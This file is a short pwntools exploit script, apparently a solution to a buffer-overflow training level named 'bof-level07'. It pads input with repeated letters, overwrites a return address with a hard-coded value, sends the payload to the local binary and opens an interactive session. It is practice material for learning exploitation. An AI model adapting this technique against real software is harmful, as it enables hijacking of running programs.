#!/usr/bin/env python
from pwn import *

######################################################
payload = ''
for letter in 'abcdefghijklmnopqrstuv':
  payload += letter*4
payload += '\x16\x85\x04\x08'
for letter in 'wxyzABCDEFGH':
  payload += letter*4
payload += '\x00'
######################################################

context.terminal = ['tmux', 'splitw', '-h']

target = process('./bof-level07')
#target = process('./bof-level07', setuid=False)
#gdb.attach(target, f'b *receive_input +138')

target.recvline()

target.send(payload) 

target.interactive()
